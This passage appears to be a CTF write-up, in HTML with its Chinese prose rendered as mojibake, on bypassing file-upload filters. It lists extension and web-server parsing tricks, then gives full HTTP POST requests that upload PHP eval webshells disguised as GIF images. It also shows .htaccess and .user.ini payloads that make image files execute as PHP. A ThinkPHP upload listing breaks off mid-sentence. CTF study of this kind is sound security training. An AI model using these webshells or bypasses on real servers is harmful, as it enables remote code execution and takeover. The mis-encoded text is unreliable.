alt="image-20200830213958438"></p><ul><li>åˆ©ç”¨ä¸­é—´ä»¶è§£ææ¼æ´ç»•è¿‡æ£€æŸ¥ï¼Œå®æˆ˜å¸¸ç”¨</li><li>ä¸Šä¼ .user.iniæˆ–.htaccesså°†åˆæ³•æ‹“å±•åæ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æï¼ˆ <strong>.user.ini é€‚ç”¨æ€§æ›´å¹¿</strong>ï¼Œåè€…åªèƒ½ç”¨äºApache</li></ul><blockquote><p>.user.ini  å’Œ .htaccess ä¸­çš„å°æŠ€å·§</p><p><code>\</code> å¯ç”¨äºæ¢è¡Œï¼Œå¸¸å¸¸å‡ºç°åœ¨ä¸€äº›éé¢„æœŸä¸­ã€‚</p><p>è¿˜å¯ä»¥é€šè¿‡é‡å†™è¿™ä¸¤ä¸ªæ–‡ä»¶æ”¹å˜ç¼–ç (UTF-7)æ¥ç»•è¿‡ï¼Œè¾ƒå¤æ‚ã€‚</p><p>.htaccess ä¸­ <code>#</code> å¯ç”¨äºæ³¨é‡Šã€‚</p><p>æ–‡ä»¶åŒ…å«<code>.htaccess</code> è¯»å–é…ç½®ï¼Œç„¶åè®¿é—®å…¶ä¸­çš„é“¾æ¥ã€‚</p></blockquote><ul><li>%00æˆªæ–­ç»•è¿‡</li><li>php3</li><li>php4</li><li>php5</li><li>php7</li><li>phtml</li><li>phps</li><li>pht</li><li>Windows ADSæµç‰¹æ€§ ::$DATA</li><li>Windows æ–‡ä»¶åç‰¹æ€§ï¼Œåç¼€ååŠ ç©ºæ ¼ï¼ŒåŠ å…¶ä»–å­—ç¬¦ã€‚</li></ul><h2 id="ç³»ç»Ÿç‰¹æ€§"><a href="#ç³»ç»Ÿç‰¹æ€§" class="headerlink" title="ç³»ç»Ÿç‰¹æ€§"></a>ç³»ç»Ÿç‰¹æ€§</h2><ul><li>Windowsä¸‹æ–‡ä»¶åä¸åŒºåˆ†å¤§å°å†™ï¼ŒLinuxä¸‹æ–‡ä»¶ååŒºåˆ†</li><li>Windowsä¸‹ADSæµç‰¹æ€§ï¼Œå¯¼è‡´ä¸Šä¼ æ–‡ä»¶xxx.php::$DATA = xxx.php</li><li>Windowsä¸‹æ–‡ä»¶åç»“å°¾åŠ å…¥<code>.</code>,<code>ç©ºæ ¼</code>,<code>&lt;</code>,Â·<code>&gt;</code>,<code>&gt;&gt;&gt;</code>,<code>0x81-0xff</code>ç­‰å­—ç¬¦ï¼Œæœ€ç»ˆç”Ÿæˆçš„æ–‡ä»¶å‡è¢«windowså¿½ç•¥ã€‚</li></ul><h2 id="ä¸­é—´ä»¶"><a href="#ä¸­é—´ä»¶" class="headerlink" title="ä¸­é—´ä»¶"></a>ä¸­é—´ä»¶</h2><ul><li>iis</li></ul><p>iisä¸€å…±æœ‰ä¸‰ä¸ªè§£ææ¼æ´ï¼š</p><p>1.IIS6.0æ–‡ä»¶è§£æ xx.asp;.jpg<br>2.IIS6.0ç›®å½•è§£æ xx.asp/1.jpg<br>3.IIS 7.0ç•¸å½¢è§£æ xxx.jpg/x.asp</p><ul><li>apache</li></ul><ol><li>%0a(CVE-2017-15715)</li><li>æœªçŸ¥åç¼€ test.php.xxx</li></ol><ul><li>nginx</li></ul><ol><li>è®¿é—®è¿æ¥åŠ /xxx.php test.jpg/xxx.php</li><li>ç•¸å½¢è§£ææ¼æ´ test.jpg%00xxx.php</li><li>CVE-2013-4547 test.jpg(éç¼–ç ç©ºæ ¼)\0x.php</li></ol><ul><li>tomcat</li></ul><p>tomcatç”¨äºä¸Šä¼ ç»•è¿‡çš„æœ‰ä¸‰ç§,ä¸è¿‡é™åˆ¶åœ¨windowsæ“ä½œç³»ç»Ÿä¸‹ã€‚</p><ol><li>xxx.jsp/</li><li>xxx.jsp%20</li><li>xxx.jsp::$DATA</li></ol><h2 id="æ¡†æ¶ç‰¹æ€§ã€ç¨‹åºé€»è¾‘"><a href="#æ¡†æ¶ç‰¹æ€§ã€ç¨‹åºé€»è¾‘" class="headerlink" title="æ¡†æ¶ç‰¹æ€§ã€ç¨‹åºé€»è¾‘"></a>æ¡†æ¶ç‰¹æ€§ã€ç¨‹åºé€»è¾‘</h2><p>æ¯”å¦‚ï¼š</p><ul><li><p>ThinkPHP çš„å¤šæ–‡ä»¶ä¸Šä¼ é€»è¾‘</p></li><li><p>ç¨‹åºé€»è¾‘ï¼šå¤§èƒ†å°è¯•ã€‚ï¼ˆæœ‰äº›æ˜¯å‡½æ•°ä½¿ç”¨ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´äº†ç»•è¿‡</p></li><li><p>æ¡ä»¶ç«äº‰</p></li></ul><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p>æŠ€æœ¯ç‚¹ï¼š</p><ul><li>JSç»•è¿‡å¯¹&lt;?php çš„æ£€æµ‹</li><li>Content-Type ç»•è¿‡</li><li>å¸¸è§å¯è§£æåç¼€bypass</li></ul><p>POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;upload_file.php HTTP&#x2F;1.1</span><br><span class="line">Host: 77ae3ce4-3fb3-4a06-9fc8-f986cc7b3b5a.node3.buuoj.cn</span><br><span class="line">Content-Length: 354</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;77ae3ce4-3fb3-4a06-9fc8-f986cc7b3b5a.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryeK0id0O3p4ekLat6</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;77ae3ce4-3fb3-4a06-9fc8-f986cc7b3b5a.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryeK0id0O3p4ekLat6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;basic_php_webshell.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[A]);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryeK0id0O3p4ekLat6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundaryeK0id0O3p4ekLat6--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Webshell åœ°å€ï¼šurl/upload/webshell.php  è¿æ¥å¯†ç ä¸ºAã€‚</p><p>è·å–flagï¼šè™šæ‹Ÿç»ˆç«¯æ‰§è¡Œ <code>cat /flag</code></p><p>åç«¯ä¼ªä»£ç å¯èƒ½ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/&lt;?/i&#x27;</span>,flie_get_contents($upload_file));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no &lt;?&quot;</span>;</span><br><span class="line">preg_match(<span class="string">&#x27;/|php|pht|phtm|...|/i&#x27;</span>,file_extension);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h2><p>æŠ€æœ¯ç‚¹ï¼š</p><ul><li>å‰ç«¯æ ¡éªŒbypassï¼ˆé€šè¿‡BurpSuite æŠ“åŒ…</li><li>å¸¸è§å¯è§£æåç¼€bypass</li></ul><p>POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 7f8fc00a-bb3c-4388-9b8d-d0fcdecd632c.node3.buuoj.cn</span><br><span class="line">Content-Length: 338</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;7f8fc00a-bb3c-4388-9b8d-d0fcdecd632c.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary4TEVfSl48M3KTzel</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;7f8fc00a-bb3c-4388-9b8d-d0fcdecd632c.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary4TEVfSl48M3KTzel</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;basic_php_webshell.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary4TEVfSl48M3KTzel</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundary4TEVfSl48M3KTzel--</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>æŠ€æœ¯ç‚¹ï¼š</p><ul><li>.htaccess é‡å†™ç»•è¿‡é»‘åå•è§£æGetShell</li><li>Content-Type Bypass</li><li>&lt;? Bypass</li></ul><p>ä¸Šä¼ .htaccess</p><ul><li>ä½¿ <code>png</code> æ–‡ä»¶è§£æä¸º<code>php</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType  application&#x2F;x-httpd-php    .png</span><br></pre></td></tr></table></figure><ul><li>å°†æ‰€æœ‰æ–‡ä»¶è§£æä¸º<code>php</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure><ul><li><code>.htaccess</code>ç•™åé—¨ï¼Œæ·»åŠ phpè§£æè§„åˆ™ï¼Œæ–‡ä»¶ååŒ…å«1åˆ™è§£æä¸ºphp</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 1b930c8d-beda-47e3-ba7c-85bc358075d3.node3.buuoj.cn</span><br><span class="line">Content-Length: 359</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;1b930c8d-beda-47e3-ba7c-85bc358075d3.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryWrINBQvOPdxaBJwJ</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;1b930c8d-beda-47e3-ba7c-85bc358075d3.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Cookie: PHPSESSID&#x3D;ae2f4a4366a5ea0ece393127ad9b864e</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryWrINBQvOPdxaBJwJ</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;basic_php_webshell.png&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@ eval($_POST[A]);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryWrINBQvOPdxaBJwJ</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundaryWrINBQvOPdxaBJwJ--</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>æŠ€æœ¯ç‚¹ï¼š</p><ul><li>.user.ini æ–‡ä»¶é‡å†™ç»•è¿‡é»‘åå•GetShell</li></ul><p>æŠ€æœ¯æ¦‚è¿°ï¼š</p><p><strong>auto_prepend_file</strong>æ˜¯åœ¨æ–‡ä»¶å‰æ’å…¥ï¼›<strong>auto_append_file</strong>åœ¨æ–‡ä»¶æœ€åæ’å…¥ï¼ˆå½“æ–‡ä»¶è°ƒç”¨çš„æœ‰<code>exit()</code>æ—¶è¯¥è®¾ç½®æ— æ•ˆï¼‰</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP</li><li>æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼</li><li>ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶</li></ul><p>æŠ€æœ¯ç‚¹ç»†èŠ‚å‚è€ƒï¼š<a href="https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html">https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html</a></p><ul><li>æ»¡è¶³æ¡ä»¶ä¸€ï¼šä¸Šä¼ ç›®å½•ä¸‹æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200830225232.png" alt="image-20200830225229206"></p><p>åˆ©ç”¨è¿‡ç¨‹ï¼š</p><p>å…ˆä¸Šä¼ <code>.user.ini</code> æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn</span><br><span class="line">Content-Length: 336</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary6dvjBUhTD4exggyU</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary6dvjBUhTD4exggyU</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;.user.ini&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;basic_php_webshell.jpg</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary6dvjBUhTD4exggyU</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload&quot;</span><br><span class="line"></span><br><span class="line">æäº¤</span><br><span class="line">------WebKitFormBoundary6dvjBUhTD4exggyU--</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ WebShellï¼ˆ<strong>éœ€è¦ç»•è¿‡&lt;? å’Œ Content-Type</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn</span><br><span class="line">Content-Length: 359</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary8yvecxrZpVYWNxvE</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary8yvecxrZpVYWNxvE</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;basic_php_webshell.jpg&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[A]);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary8yvecxrZpVYWNxvE</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload&quot;</span><br><span class="line"></span><br><span class="line">æäº¤</span><br><span class="line">------WebKitFormBoundary8yvecxrZpVYWNxvE--</span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123; <span class="comment">// æ£€æµ‹æ–‡ä»¶åç¼€æ˜¯å¦å«æœ‰php</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// å®ä¾‹åŒ–ä¸Šä¼ ç±»</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å¤§å°</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç±»å‹</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç›®å½•</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å­ç›®å½•</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// ä¸Šä¼ é”™è¯¯æç¤ºé”™è¯¯ä¿¡æ¯</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// ä¸Šä¼ æˆåŠŸ è·å–ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯</span></span><br><span class="line">            $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">            <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Thinkphp çš„å¤šæ–‡ä»¶ä¸Šä¼ (å½“upload()å‡½æ•°ä¸ä¼ å‚æ•°æ—¶,é»˜è®¤ä¸ºå¤šæ–‡ä»¶ä¸Šä¼ ,æ•´ä¸ª$_FILESæ•°ç»„çš„æ–‡ä»¶éƒ½ä¼šè¢«ä¸Šä¼ )</li><li>uniqid è®¾ç½®æ–‡ä»¶è·¯å¾„ä¸åˆç†, 